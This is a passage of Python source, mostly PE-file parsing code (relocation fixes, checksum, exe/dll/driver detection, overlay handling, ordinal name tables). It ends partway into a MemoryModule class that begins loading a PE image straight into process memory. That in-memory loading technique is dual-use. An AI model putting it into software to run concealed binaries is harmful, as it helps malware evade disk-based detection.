                            # Add relocation_difference to the value at RVA=entry.rva

                            self.set_dword_at_rva(
                                entry.rva,
                                self.get_dword_at_rva(entry.rva)
                                + relocation_difference,
                            )

                        elif entry.type == RELOCATION_TYPE["IMAGE_REL_BASED_HIGHADJ"]:
                            # Fix the high 16-bits of a relocation and adjust
                            #
                            # Add high 16-bits of relocation_difference to the 32-bit
                            # value composed from the (16-bit value at
                            # RVA=entry.rva)<<16 plus the 16-bit value at the next
                            # relocation entry.

                            # If the next entry is beyond the array's limits,
                            # abort... the table is corrupt
                            if entry_idx == len(reloc.entries):
                                break

                            next_entry = reloc.entries[entry_idx]
                            entry_idx += 1
                            self.set_word_at_rva(
                                entry.rva,
                                (
                                    (self.get_word_at_rva(entry.rva) << 16)
                                    + next_entry.rva
                                    + relocation_difference
                                    & 0xFFFF0000
                                )
                                >> 16,
                            )

                        elif entry.type == RELOCATION_TYPE["IMAGE_REL_BASED_DIR64"]:
                            # Apply the difference to the 64-bit value at the offset
                            # RVA=entry.rva

                            self.set_qword_at_rva(
                                entry.rva,
                                self.get_qword_at_rva(entry.rva)
                                + relocation_difference,
                            )

            self.OPTIONAL_HEADER.ImageBase = new_ImageBase

            # correct VAs(virtual addresses) occurrences in directory information
            if hasattr(self, "DIRECTORY_ENTRY_IMPORT"):
                for dll in self.DIRECTORY_ENTRY_IMPORT:
                    for func in dll.imports:
                        func.address += relocation_difference
            if hasattr(self, "DIRECTORY_ENTRY_TLS"):
                self.DIRECTORY_ENTRY_TLS.struct.StartAddressOfRawData += (
                    relocation_difference
                )
                self.DIRECTORY_ENTRY_TLS.struct.EndAddressOfRawData += (
                    relocation_difference
                )
                self.DIRECTORY_ENTRY_TLS.struct.AddressOfIndex += relocation_difference
                self.DIRECTORY_ENTRY_TLS.struct.AddressOfCallBacks += (
                    relocation_difference
                )
            if hasattr(self, "DIRECTORY_ENTRY_LOAD_CONFIG"):
                if self.DIRECTORY_ENTRY_LOAD_CONFIG.struct.LockPrefixTable:
                    self.DIRECTORY_ENTRY_LOAD_CONFIG.struct.LockPrefixTable += (
                        relocation_difference
                    )
                if self.DIRECTORY_ENTRY_LOAD_CONFIG.struct.EditList:
                    self.DIRECTORY_ENTRY_LOAD_CONFIG.struct.EditList += (
                        relocation_difference
                    )
                if self.DIRECTORY_ENTRY_LOAD_CONFIG.struct.SecurityCookie:
                    self.DIRECTORY_ENTRY_LOAD_CONFIG.struct.SecurityCookie += (
                        relocation_difference
                    )
                if self.DIRECTORY_ENTRY_LOAD_CONFIG.struct.SEHandlerTable:
                    self.DIRECTORY_ENTRY_LOAD_CONFIG.struct.SEHandlerTable += (
                        relocation_difference
                    )
                if self.DIRECTORY_ENTRY_LOAD_CONFIG.struct.GuardCFCheckFunctionPointer:
                    self.DIRECTORY_ENTRY_LOAD_CONFIG.struct.GuardCFCheckFunctionPointer += (
                        relocation_difference
                    )
                if self.DIRECTORY_ENTRY_LOAD_CONFIG.struct.GuardCFFunctionTable:
                    self.DIRECTORY_ENTRY_LOAD_CONFIG.struct.GuardCFFunctionTable += (
                        relocation_difference
                    )

    def verify_checksum(self):

        return self.OPTIONAL_HEADER.CheckSum == self.generate_checksum()

    def generate_checksum(self):
        # This will make sure that the data representing the PE image
        # is updated with any changes that might have been made by
        # assigning values to header fields as those are not automatically
        # updated upon assignment.
        #
        # data = self.write()
        # print('{0}'.format(len(data)))
        # for idx, b in enumerate(data):
        #     if b != ord(self.__data__[idx]) or (idx > 1244440 and idx < 1244460):
        #         print('Idx: {0} G {1:02x} {3} B {2:02x}'.format(
        #             idx, ord(self.__data__[idx]), b,
        #             self.__data__[idx], chr(b)))
        self.__data__ = self.write()

        # Get the offset to the CheckSum field in the OptionalHeader
        # (The offset is the same in PE32 and PE32+)
        checksum_offset = self.OPTIONAL_HEADER.get_file_offset() + 0x40  # 64

        checksum = 0
        # Verify the data is dword-aligned. Add padding if needed
        #
        remainder = len(self.__data__) % 4
        data_len = len(self.__data__) + ((4 - remainder) * (remainder != 0))

        for i in range(int(data_len / 4)):
            # Skip the checksum field
            if i == int(checksum_offset / 4):
                continue
            if i + 1 == (int(data_len / 4)) and remainder:
                dword = struct.unpack(
                    "I", self.__data__[i * 4 :] + (b"\0" * (4 - remainder))
                )[0]
            else:
                dword = struct.unpack("I", self.__data__[i * 4 : i * 4 + 4])[0]
            # Optimized the calculation (thanks to Emmanuel Bourg for pointing it out!)
            checksum += dword
            if checksum >= 2**32:
                checksum = (checksum & 0xFFFFFFFF) + (checksum >> 32)

        checksum = (checksum & 0xFFFF) + (checksum >> 16)
        checksum = (checksum) + (checksum >> 16)
        checksum = checksum & 0xFFFF

        # The length is the one of the original data, not the padded one
        #
        return checksum + len(self.__data__)

    def is_exe(self):
        """Check whether the file is a standard executable.

        This will return true only if the file has the IMAGE_FILE_EXECUTABLE_IMAGE flag
        set and the IMAGE_FILE_DLL not set and the file does not appear to be a driver
        either.
        """

        EXE_flag = IMAGE_CHARACTERISTICS["IMAGE_FILE_EXECUTABLE_IMAGE"]

        if (
            (not self.is_dll())
            and (not self.is_driver())
            and (EXE_flag & self.FILE_HEADER.Characteristics) == EXE_flag
        ):
            return True

        return False

    def is_dll(self):
        """Check whether the file is a standard DLL.

        This will return true only if the image has the IMAGE_FILE_DLL flag set.
        """

        DLL_flag = IMAGE_CHARACTERISTICS["IMAGE_FILE_DLL"]

        if (DLL_flag & self.FILE_HEADER.Characteristics) == DLL_flag:
            return True

        return False

    def is_driver(self):
        """Check whether the file is a Windows driver.

        This will return true only if there are reliable indicators of the image
        being a driver.
        """

        # Checking that the ImageBase field of the OptionalHeader is above or
        # equal to 0x80000000 (that is, whether it lies in the upper 2GB of
        # the address space, normally belonging to the kernel) is not a
        # reliable enough indicator.  For instance, PEs that play the invalid
        # ImageBase trick to get relocated could be incorrectly assumed to be
        # drivers.

        # This is not reliable either...
        #
        # if any((section.Characteristics &
        #           SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_NOT_PAGED']) for
        #        section in self.sections ):
        #    return True

        # If the import directory was not parsed (fast_load = True); do it now.
        if not hasattr(self, "DIRECTORY_ENTRY_IMPORT"):
            self.parse_data_directories(
                directories=[DIRECTORY_ENTRY["IMAGE_DIRECTORY_ENTRY_IMPORT"]]
            )

        # If there's still no import directory (the PE doesn't have one or it's
        # malformed), give up.
        if not hasattr(self, "DIRECTORY_ENTRY_IMPORT"):
            return False

        # self.DIRECTORY_ENTRY_IMPORT will now exist, although it may be empty.
        # If it imports from "ntoskrnl.exe" or other kernel components it should
        # be a driver
        #
        system_DLLs = set(
            (b"ntoskrnl.exe", b"hal.dll", b"ndis.sys", b"bootvid.dll", b"kdcom.dll")
        )
        if system_DLLs.intersection(
            [imp.dll.lower() for imp in self.DIRECTORY_ENTRY_IMPORT]
        ):
            return True

        driver_like_section_names = set((b"page", b"paged"))
        if driver_like_section_names.intersection(
            [section.Name.lower().rstrip(b"\x00") for section in self.sections]
        ) and (
            self.OPTIONAL_HEADER.Subsystem
            in (
                SUBSYSTEM_TYPE["IMAGE_SUBSYSTEM_NATIVE"],
                SUBSYSTEM_TYPE["IMAGE_SUBSYSTEM_NATIVE_WINDOWS"],
            )
        ):
            return True

        return False

    def get_overlay_data_start_offset(self):
        """Get the offset of data appended to the file and not contained within
        the area described in the headers."""

        largest_offset_and_size = (0, 0)

        def update_if_sum_is_larger_and_within_file(
            offset_and_size, file_size=len(self.__data__)
        ):
            if sum(offset_and_size) <= file_size and sum(offset_and_size) > sum(
                largest_offset_and_size
            ):
                return offset_and_size
            return largest_offset_and_size

        if hasattr(self, "OPTIONAL_HEADER"):
            largest_offset_and_size = update_if_sum_is_larger_and_within_file(
                (
                    self.OPTIONAL_HEADER.get_file_offset(),
                    self.FILE_HEADER.SizeOfOptionalHeader,
                )
            )

        for section in self.sections:
            largest_offset_and_size = update_if_sum_is_larger_and_within_file(
                (section.PointerToRawData, section.SizeOfRawData)
            )

        skip_directories = [DIRECTORY_ENTRY["IMAGE_DIRECTORY_ENTRY_SECURITY"]]

        for idx, directory in enumerate(self.OPTIONAL_HEADER.DATA_DIRECTORY):
            if idx in skip_directories:
                continue
            try:
                largest_offset_and_size = update_if_sum_is_larger_and_within_file(
                    (self.get_offset_from_rva(directory.VirtualAddress), directory.Size)
                )
            # Ignore directories with RVA out of file
            except PEFormatError:
                continue

        if len(self.__data__) > sum(largest_offset_and_size):
            return sum(largest_offset_and_size)

        return None

    def get_overlay(self):
        """Get the data appended to the file and not contained within the area described
        in the headers."""

        overlay_data_offset = self.get_overlay_data_start_offset()

        if overlay_data_offset is not None:
            return self.__data__[overlay_data_offset:]

        return None

    def trim(self):
        """Return the just data defined by the PE headers, removing any overlaid data."""

        overlay_data_offset = self.get_overlay_data_start_offset()

        if overlay_data_offset is not None:
            return self.__data__[:overlay_data_offset]

        return self.__data__[:]

    # According to http://corkami.blogspot.com/2010/01/parce-que-la-planche-aura-brule.html
    # if PointerToRawData is less that 0x200 it's rounded to zero. Loading the test file
    # in a debugger it's easy to verify that the PointerToRawData value of 1 is rounded
    # to zero. Hence we reproduce the behavior
    #
    # According to the document:
    # [ Microsoft Portable Executable and Common Object File Format Specification ]
    # "The alignment factor (in bytes) that is used to align the raw data of sections in
    #  the image file. The value should be a power of 2 between 512 and 64 K, inclusive.
    #  The default is 512. If the SectionAlignment is less than the architecture's page
    #  size, then FileAlignment must match SectionAlignment."
    #
    # The following is a hard-coded constant if the Windows loader
    def adjust_FileAlignment(self, val, file_alignment):
        if file_alignment > FILE_ALIGNMENT_HARDCODED_VALUE:
            # If it's not a power of two, report it:
            if self.FileAlignment_Warning is False and not power_of_two(file_alignment):
                self.__warnings.append(
                    "If FileAlignment > 0x200 it should be a power of 2. Value: %x"
                    % (file_alignment)
                )
                self.FileAlignment_Warning = True

        return cache_adjust_FileAlignment(val, file_alignment)

    # According to the document:
    # [ Microsoft Portable Executable and Common Object File Format Specification ]
    # "The alignment (in bytes) of sections when they are loaded into memory. It must be
    #  greater than or equal to FileAlignment. The default is the page size for the
    #  architecture."
    #
    def adjust_SectionAlignment(self, val, section_alignment, file_alignment):
        if file_alignment < FILE_ALIGNMENT_HARDCODED_VALUE:
            if (
                file_alignment != section_alignment
                and self.SectionAlignment_Warning is False
            ):
                self.__warnings.append(
                    "If FileAlignment(%x) < 0x200 it should equal SectionAlignment(%x)"
                    % (file_alignment, section_alignment)
                )
                self.SectionAlignment_Warning = True

        return cache_adjust_SectionAlignment(val, section_alignment, file_alignment)
oleAuth32_ord_names = {
    2: b"SysAllocString",
    3: b"SysReAllocString",
    4: b"SysAllocStringLen",
    5: b"SysReAllocStringLen",
    6: b"SysFreeString",
    7: b"SysStringLen",
    8: b"VariantInit",
    9: b"VariantClear",
    10: b"VariantCopy",
    11: b"VariantCopyInd",
    12: b"VariantChangeType",
    13: b"VariantTimeToDosDateTime",
    14: b"DosDateTimeToVariantTime",
    15: b"SafeArrayCreate",
    16: b"SafeArrayDestroy",
    17: b"SafeArrayGetDim",
    18: b"SafeArrayGetElemsize",
    19: b"SafeArrayGetUBound",
    20: b"SafeArrayGetLBound",
    21: b"SafeArrayLock",
    22: b"SafeArrayUnlock",
    23: b"SafeArrayAccessData",
    24: b"SafeArrayUnaccessData",
    25: b"SafeArrayGetElement",
    26: b"SafeArrayPutElement",
    27: b"SafeArrayCopy",
    28: b"DispGetParam",
    29: b"DispGetIDsOfNames",
    30: b"DispInvoke",
    31: b"CreateDispTypeInfo",
    32: b"CreateStdDispatch",
    33: b"RegisterActiveObject",
    34: b"RevokeActiveObject",
    35: b"GetActiveObject",
    36: b"SafeArrayAllocDescriptor",
    37: b"SafeArrayAllocData",
    38: b"SafeArrayDestroyDescriptor",
    39: b"SafeArrayDestroyData",
    40: b"SafeArrayRedim",
    41: b"SafeArrayAllocDescriptorEx",
    42: b"SafeArrayCreateEx",
    43: b"SafeArrayCreateVectorEx",
    44: b"SafeArraySetRecordInfo",
    45: b"SafeArrayGetRecordInfo",
    46: b"VarParseNumFromStr",
    47: b"VarNumFromParseNum",
    48: b"VarI2FromUI1",
    49: b"VarI2FromI4",
    50: b"VarI2FromR4",
    51: b"VarI2FromR8",
    52: b"VarI2FromCy",
    53: b"VarI2FromDate",
    54: b"VarI2FromStr",
    55: b"VarI2FromDisp",
    56: b"VarI2FromBool",
    57: b"SafeArraySetIID",
    58: b"VarI4FromUI1",
    59: b"VarI4FromI2",
    60: b"VarI4FromR4",
    61: b"VarI4FromR8",
    62: b"VarI4FromCy",
    63: b"VarI4FromDate",
    64: b"VarI4FromStr",
    65: b"VarI4FromDisp",
    66: b"VarI4FromBool",
    67: b"SafeArrayGetIID",
    68: b"VarR4FromUI1",
    69: b"VarR4FromI2",
    70: b"VarR4FromI4",
    71: b"VarR4FromR8",
    72: b"VarR4FromCy",
    73: b"VarR4FromDate",
    74: b"VarR4FromStr",
    75: b"VarR4FromDisp",
    76: b"VarR4FromBool",
    77: b"SafeArrayGetVartype",
    78: b"VarR8FromUI1",
    79: b"VarR8FromI2",
    80: b"VarR8FromI4",
    81: b"VarR8FromR4",
    82: b"VarR8FromCy",
    83: b"VarR8FromDate",
    84: b"VarR8FromStr",
    85: b"VarR8FromDisp",
    86: b"VarR8FromBool",
    87: b"VarFormat",
    88: b"VarDateFromUI1",
    89: b"VarDateFromI2",
    90: b"VarDateFromI4",
    91: b"VarDateFromR4",
    92: b"VarDateFromR8",
    93: b"VarDateFromCy",
    94: b"VarDateFromStr",
    95: b"VarDateFromDisp",
    96: b"VarDateFromBool",
    97: b"VarFormatDateTime",
    98: b"VarCyFromUI1",
    99: b"VarCyFromI2",
    100: b"VarCyFromI4",
    101: b"VarCyFromR4",
    102: b"VarCyFromR8",
    103: b"VarCyFromDate",
    104: b"VarCyFromStr",
    105: b"VarCyFromDisp",
    106: b"VarCyFromBool",
    107: b"VarFormatNumber",
    108: b"VarBstrFromUI1",
    109: b"VarBstrFromI2",
    110: b"VarBstrFromI4",
    111: b"VarBstrFromR4",
    112: b"VarBstrFromR8",
    113: b"VarBstrFromCy",
    114: b"VarBstrFromDate",
    115: b"VarBstrFromDisp",
    116: b"VarBstrFromBool",
    117: b"VarFormatPercent",
    118: b"VarBoolFromUI1",
    119: b"VarBoolFromI2",
    120: b"VarBoolFromI4",
    121: b"VarBoolFromR4",
    122: b"VarBoolFromR8",
    123: b"VarBoolFromDate",
    124: b"VarBoolFromCy",
    125: b"VarBoolFromStr",
    126: b"VarBoolFromDisp",
    127: b"VarFormatCurrency",
    128: b"VarWeekdayName",
    129: b"VarMonthName",
    130: b"VarUI1FromI2",
    131: b"VarUI1FromI4",
    132: b"VarUI1FromR4",
    133: b"VarUI1FromR8",
    134: b"VarUI1FromCy",
    135: b"VarUI1FromDate",
    136: b"VarUI1FromStr",
    137: b"VarUI1FromDisp",
    138: b"VarUI1FromBool",
    139: b"VarFormatFromTokens",
    140: b"VarTokenizeFormatString",
    141: b"VarAdd",
    142: b"VarAnd",
    143: b"VarDiv",
    144: b"DllCanUnloadNow",
    145: b"DllGetClassObject",
    146: b"DispCallFunc",
    147: b"VariantChangeTypeEx",
    148: b"SafeArrayPtrOfIndex",
    149: b"SysStringByteLen",
    150: b"SysAllocStringByteLen",
    151: b"DllRegisterServer",
    152: b"VarEqv",
    153: b"VarIdiv",
    154: b"VarImp",
    155: b"VarMod",
    156: b"VarMul",
    157: b"VarOr",
    158: b"VarPow",
    159: b"VarSub",
    160: b"CreateTypeLib",
    161: b"LoadTypeLib",
    162: b"LoadRegTypeLib",
    163: b"RegisterTypeLib",
    164: b"QueryPathOfRegTypeLib",
    165: b"LHashValOfNameSys",
    166: b"LHashValOfNameSysA",
    167: b"VarXor",
    168: b"VarAbs",
    169: b"VarFix",
    170: b"OaBuildVersion",
    171: b"ClearCustData",
    172: b"VarInt",
    173: b"VarNeg",
    174: b"VarNot",
    175: b"VarRound",
    176: b"VarCmp",
    177: b"VarDecAdd",
    178: b"VarDecDiv",
    179: b"VarDecMul",
    180: b"CreateTypeLib2",
    181: b"VarDecSub",
    182: b"VarDecAbs",
    183: b"LoadTypeLibEx",
    184: b"SystemTimeToVariantTime",
    185: b"VariantTimeToSystemTime",
    186: b"UnRegisterTypeLib",
    187: b"VarDecFix",
    188: b"VarDecInt",
    189: b"VarDecNeg",
    190: b"VarDecFromUI1",
    191: b"VarDecFromI2",
    192: b"VarDecFromI4",
    193: b"VarDecFromR4",
    194: b"VarDecFromR8",
    195: b"VarDecFromDate",
    196: b"VarDecFromCy",
    197: b"VarDecFromStr",
    198: b"VarDecFromDisp",
    199: b"VarDecFromBool",
    200: b"GetErrorInfo",
    201: b"SetErrorInfo",
    202: b"CreateErrorInfo",
    203: b"VarDecRound",
    204: b"VarDecCmp",
    205: b"VarI2FromI1",
    206: b"VarI2FromUI2",
    207: b"VarI2FromUI4",
    208: b"VarI2FromDec",
    209: b"VarI4FromI1",
    210: b"VarI4FromUI2",
    211: b"VarI4FromUI4",
    212: b"VarI4FromDec",
    213: b"VarR4FromI1",
    214: b"VarR4FromUI2",
    215: b"VarR4FromUI4",
    216: b"VarR4FromDec",
    217: b"VarR8FromI1",
    218: b"VarR8FromUI2",
    219: b"VarR8FromUI4",
    220: b"VarR8FromDec",
    221: b"VarDateFromI1",
    222: b"VarDateFromUI2",
    223: b"VarDateFromUI4",
    224: b"VarDateFromDec",
    225: b"VarCyFromI1",
    226: b"VarCyFromUI2",
    227: b"VarCyFromUI4",
    228: b"VarCyFromDec",
    229: b"VarBstrFromI1",
    230: b"VarBstrFromUI2",
    231: b"VarBstrFromUI4",
    232: b"VarBstrFromDec",
    233: b"VarBoolFromI1",
    234: b"VarBoolFromUI2",
    235: b"VarBoolFromUI4",
    236: b"VarBoolFromDec",
    237: b"VarUI1FromI1",
    238: b"VarUI1FromUI2",
    239: b"VarUI1FromUI4",
    240: b"VarUI1FromDec",
    241: b"VarDecFromI1",
    242: b"VarDecFromUI2",
    243: b"VarDecFromUI4",
    244: b"VarI1FromUI1",
    245: b"VarI1FromI2",
    246: b"VarI1FromI4",
    247: b"VarI1FromR4",
    248: b"VarI1FromR8",
    249: b"VarI1FromDate",
    250: b"VarI1FromCy",
    251: b"VarI1FromStr",
    252: b"VarI1FromDisp",
    253: b"VarI1FromBool",
    254: b"VarI1FromUI2",
    255: b"VarI1FromUI4",
    256: b"VarI1FromDec",
    257: b"VarUI2FromUI1",
    258: b"VarUI2FromI2",
    259: b"VarUI2FromI4",
    260: b"VarUI2FromR4",
    261: b"VarUI2FromR8",
    262: b"VarUI2FromDate",
    263: b"VarUI2FromCy",
    264: b"VarUI2FromStr",
    265: b"VarUI2FromDisp",
    266: b"VarUI2FromBool",
    267: b"VarUI2FromI1",
    268: b"VarUI2FromUI4",
    269: b"VarUI2FromDec",
    270: b"VarUI4FromUI1",
    271: b"VarUI4FromI2",
    272: b"VarUI4FromI4",
    273: b"VarUI4FromR4",
    274: b"VarUI4FromR8",
    275: b"VarUI4FromDate",
    276: b"VarUI4FromCy",
    277: b"VarUI4FromStr",
    278: b"VarUI4FromDisp",
    279: b"VarUI4FromBool",
    280: b"VarUI4FromI1",
    281: b"VarUI4FromUI2",
    282: b"VarUI4FromDec",
    283: b"BSTR_UserSize",
    284: b"BSTR_UserMarshal",
    285: b"BSTR_UserUnmarshal",
    286: b"BSTR_UserFree",
    287: b"VARIANT_UserSize",
    288: b"VARIANT_UserMarshal",
    289: b"VARIANT_UserUnmarshal",
    290: b"VARIANT_UserFree",
    291: b"LPSAFEARRAY_UserSize",
    292: b"LPSAFEARRAY_UserMarshal",
    293: b"LPSAFEARRAY_UserUnmarshal",
    294: b"LPSAFEARRAY_UserFree",
    295: b"LPSAFEARRAY_Size",
    296: b"LPSAFEARRAY_Marshal",
    297: b"LPSAFEARRAY_Unmarshal",
    298: b"VarDecCmpR8",
    299: b"VarCyAdd",
    300: b"DllUnregisterServer",
    301: b"OACreateTypeLib2",
    303: b"VarCyMul",
    304: b"VarCyMulI4",
    305: b"VarCySub",
    306: b"VarCyAbs",
    307: b"VarCyFix",
    308: b"VarCyInt",
    309: b"VarCyNeg",
    310: b"VarCyRound",
    311: b"VarCyCmp",
    312: b"VarCyCmpR8",
    313: b"VarBstrCat",
    314: b"VarBstrCmp",
    315: b"VarR8Pow",
    316: b"VarR4CmpR8",
    317: b"VarR8Round",
    318: b"VarCat",
    319: b"VarDateFromUdateEx",
    322: b"GetRecordInfoFromGuids",
    323: b"GetRecordInfoFromTypeInfo",
    325: b"SetVarConversionLocaleSetting",
    326: b"GetVarConversionLocaleSetting",
    327: b"SetOaNoCache",
    329: b"VarCyMulI8",
    330: b"VarDateFromUdate",
    331: b"VarUdateFromDate",
    332: b"GetAltMonthNames",
    333: b"VarI8FromUI1",
    334: b"VarI8FromI2",
    335: b"VarI8FromR4",
    336: b"VarI8FromR8",
    337: b"VarI8FromCy",
    338: b"VarI8FromDate",
    339: b"VarI8FromStr",
    340: b"VarI8FromDisp",
    341: b"VarI8FromBool",
    342: b"VarI8FromI1",
    343: b"VarI8FromUI2",
    344: b"VarI8FromUI4",
    345: b"VarI8FromDec",
    346: b"VarI2FromI8",
    347: b"VarI2FromUI8",
    348: b"VarI4FromI8",
    349: b"VarI4FromUI8",
    360: b"VarR4FromI8",
    361: b"VarR4FromUI8",
    362: b"VarR8FromI8",
    363: b"VarR8FromUI8",
    364: b"VarDateFromI8",
    365: b"VarDateFromUI8",
    366: b"VarCyFromI8",
    367: b"VarCyFromUI8",
    368: b"VarBstrFromI8",
    369: b"VarBstrFromUI8",
    370: b"VarBoolFromI8",
    371: b"VarBoolFromUI8",
    372: b"VarUI1FromI8",
    373: b"VarUI1FromUI8",
    374: b"VarDecFromI8",
    375: b"VarDecFromUI8",
    376: b"VarI1FromI8",
    377: b"VarI1FromUI8",
    378: b"VarUI2FromI8",
    379: b"VarUI2FromUI8",
    401: b"OleLoadPictureEx",
    402: b"OleLoadPictureFileEx",
    411: b"SafeArrayCreateVector",
    412: b"SafeArrayCopyData",
    413: b"VectorFromBstr",
    414: b"BstrFromVector",
    415: b"OleIconToCursor",
    416: b"OleCreatePropertyFrameIndirect",
    417: b"OleCreatePropertyFrame",
    418: b"OleLoadPicture",
    419: b"OleCreatePictureIndirect",
    420: b"OleCreateFontIndirect",
    421: b"OleTranslateColor",
    422: b"OleLoadPictureFile",
    423: b"OleSavePictureFile",
    424: b"OleLoadPicturePath",
    425: b"VarUI4FromI8",
    426: b"VarUI4FromUI8",
    427: b"VarI8FromUI8",
    428: b"VarUI8FromI8",
    429: b"VarUI8FromUI1",
    430: b"VarUI8FromI2",
    431: b"VarUI8FromR4",
    432: b"VarUI8FromR8",
    433: b"VarUI8FromCy",
    434: b"VarUI8FromDate",
    435: b"VarUI8FromStr",
    436: b"VarUI8FromDisp",
    437: b"VarUI8FromBool",
    438: b"VarUI8FromI1",
    439: b"VarUI8FromUI2",
    440: b"VarUI8FromUI4",
    441: b"VarUI8FromDec",
    442: b"RegisterTypeLibForUser",
    443: b"UnRegisterTypeLibForUser",
}
ws2_32_ord_names = {
    1: b"accept",
    2: b"bind",
    3: b"closesocket",
    4: b"connect",
    5: b"getpeername",
    6: b"getsockname",
    7: b"getsockopt",
    8: b"htonl",
    9: b"htons",
    10: b"ioctlsocket",
    11: b"inet_addr",
    12: b"inet_ntoa",
    13: b"listen",
    14: b"ntohl",
    15: b"ntohs",
    16: b"recv",
    17: b"recvfrom",
    18: b"select",
    19: b"send",
    20: b"sendto",
    21: b"setsockopt",
    22: b"shutdown",
    23: b"socket",
    24: b"GetAddrInfoW",
    25: b"GetNameInfoW",
    26: b"WSApSetPostRoutine",
    27: b"FreeAddrInfoW",
    28: b"WPUCompleteOverlappedRequest",
    29: b"WSAAccept",
    30: b"WSAAddressToStringA",
    31: b"WSAAddressToStringW",
    32: b"WSACloseEvent",
    33: b"WSAConnect",
    34: b"WSACreateEvent",
    35: b"WSADuplicateSocketA",
    36: b"WSADuplicateSocketW",
    37: b"WSAEnumNameSpaceProvidersA",
    38: b"WSAEnumNameSpaceProvidersW",
    39: b"WSAEnumNetworkEvents",
    40: b"WSAEnumProtocolsA",
    41: b"WSAEnumProtocolsW",
    42: b"WSAEventSelect",
    43: b"WSAGetOverlappedResult",
    44: b"WSAGetQOSByName",
    45: b"WSAGetServiceClassInfoA",
    46: b"WSAGetServiceClassInfoW",
    47: b"WSAGetServiceClassNameByClassIdA",
    48: b"WSAGetServiceClassNameByClassIdW",
    49: b"WSAHtonl",
    50: b"WSAHtons",
    51: b"gethostbyaddr",
    52: b"gethostbyname",
    53: b"getprotobyname",
    54: b"getprotobynumber",
    55: b"getservbyname",
    56: b"getservbyport",
    57: b"gethostname",
    58: b"WSAInstallServiceClassA",
    59: b"WSAInstallServiceClassW",
    60: b"WSAIoctl",
    61: b"WSAJoinLeaf",
    62: b"WSALookupServiceBeginA",
    63: b"WSALookupServiceBeginW",
    64: b"WSALookupServiceEnd",
    65: b"WSALookupServiceNextA",
    66: b"WSALookupServiceNextW",
    67: b"WSANSPIoctl",
    68: b"WSANtohl",
    69: b"WSANtohs",
    70: b"WSAProviderConfigChange",
    71: b"WSARecv",
    72: b"WSARecvDisconnect",
    73: b"WSARecvFrom",
    74: b"WSARemoveServiceClass",
    75: b"WSAResetEvent",
    76: b"WSASend",
    77: b"WSASendDisconnect",
    78: b"WSASendTo",
    79: b"WSASetEvent",
    80: b"WSASetServiceA",
    81: b"WSASetServiceW",
    82: b"WSASocketA",
    83: b"WSASocketW",
    84: b"WSAStringToAddressA",
    85: b"WSAStringToAddressW",
    86: b"WSAWaitForMultipleEvents",
    87: b"WSCDeinstallProvider",
    88: b"WSCEnableNSProvider",
    89: b"WSCEnumProtocols",
    90: b"WSCGetProviderPath",
    91: b"WSCInstallNameSpace",
    92: b"WSCInstallProvider",
    93: b"WSCUnInstallNameSpace",
    94: b"WSCUpdateProvider",
    95: b"WSCWriteNameSpaceOrder",
    96: b"WSCWriteProviderOrder",
    97: b"freeaddrinfo",
    98: b"getaddrinfo",
    99: b"getnameinfo",
    101: b"WSAAsyncSelect",
    102: b"WSAAsyncGetHostByAddr",
    103: b"WSAAsyncGetHostByName",
    104: b"WSAAsyncGetProtoByNumber",
    105: b"WSAAsyncGetProtoByName",
    106: b"WSAAsyncGetServByPort",
    107: b"WSAAsyncGetServByName",
    108: b"WSACancelAsyncRequest",
    109: b"WSASetBlockingHook",
    110: b"WSAUnhookBlockingHook",
    111: b"WSAGetLastError",
    112: b"WSASetLastError",
    113: b"WSACancelBlockingCall",
    114: b"WSAIsBlocking",
    115: b"WSAStartup",
    116: b"WSACleanup",
    151: b"__WSAFDIsSet",
    500: b"WEP",
}
ords = {
    b"ws2_32.dll": ws2_32_ord_names,
    b"wsock32.dll": ws2_32_ord_names,
    b"oleaut32.dll": oleAuth32_ord_names,
}


def formatOrdString(ord_val):
    return "ord{}".format(ord_val).encode()


def ordLookup(libname, ord_val, make_name=False):
    """
    Lookup a name for the given ordinal if it's in our
    database.
    """
    names = ords.get(libname.lower())
    if names is None:
        if make_name is True:
            return formatOrdString(ord_val)
        return None
    name = names.get(ord_val)
    if name is None:
        return formatOrdString(ord_val)
    return name

class MemoryModule(PE):

	_foffsets_ = {}

	def __init__(self, name = None, data = None, debug=False):
#		self._debug_ = debug or debug_output
		self._debug_ = debug 
		PE.__init__(self, name, data)
		self.load_module()

	def dbg(self, msg, *args):
		if not self._debug_: return
		if len(args) > 0:
			msg = msg % tuple(args)
		print('DEBUG: %s' % msg)

	def load_module(self):
		if not self.is_exe() and not self.is_dll():
			raise WindowsError('The specified module does not appear to be an exe nor a dll.')
		if self.PE_TYPE == OPTIONAL_HEADER_MAGIC_PE and isx64:
			raise WindowsError('The exe you attempted to load appears to be an 32-bit exe, but you are using a 64-bit version of Python.')
		elif self.PE_TYPE == OPTIONAL_HEADER_MAGIC_PE_PLUS and not isx64:
			raise WindowsError('The exe you attempted to load appears to be an 64-bit exe, but you are using a 32-bit version of Python.')
		
		self._codebaseaddr = VirtualAlloc(
			self.OPTIONAL_HEADER.ImageBase, # To test relocations, add some values here i.e. +int(0x030000000)
			self.OPTIONAL_HEADER.SizeOfImage,
			MEM_RESERVE,
			PAGE_READWRITE
		)

		if not bool(self._codebaseaddr):
			self._codebaseaddr = VirtualAlloc(
				NULL,
				self.OPTIONAL_HEADER.SizeOfImage,
				MEM_RESERVE,
				PAGE_READWRITE
			)
			if not bool(self._codebaseaddr):
				raise WindowsError('Cannot reserve memory')

		codebase = self._codebaseaddr
		self.dbg('Reserved %d bytes for dll at address: 0x%x', self.OPTIONAL_HEADER.SizeOfImage, codebase)
		self.pythonmemorymodule = cast(HeapAlloc(GetProcessHeap(), 0, sizeof(MEMORYMODULE)), PMEMORYMODULE)
		self.pythonmemorymodule.contents.codeBase = codebase
		self.pythonmemorymodule.contents.numModules = 0
		self.pythonmemorymodule.contents.modules = cast(NULL, PHMODULE)
		self.pythonmemorymodule.contents.initialized = 0

		# Committing memory.
		VirtualAlloc(
			codebase,
			self.OPTIONAL_HEADER.SizeOfImage,
			MEM_COMMIT,
			PAGE_READWRITE
		)
		self._headersaddr = VirtualAlloc(
			codebase,
			self.OPTIONAL_HEADER.SizeOfHeaders,
			MEM_COMMIT,
			PAGE_READWRITE
		)
		if not bool(self._headersaddr):
			raise WindowsError('Could not commit memory for PE Headers!')

		szheaders = self.DOS_HEADER.e_lfanew + self.OPTIONAL_HEADER.SizeOfHeaders
		tmpheaders = create_unsigned_buffer(szheaders, self.__data__[:szheaders])
		if not memmove(self._headersaddr, cast(tmpheaders, c_void_p), szheaders):
			 raise RuntimeError('memmove failed')
		del tmpheaders

		self._headersaddr += self.DOS_HEADER.e_lfanew
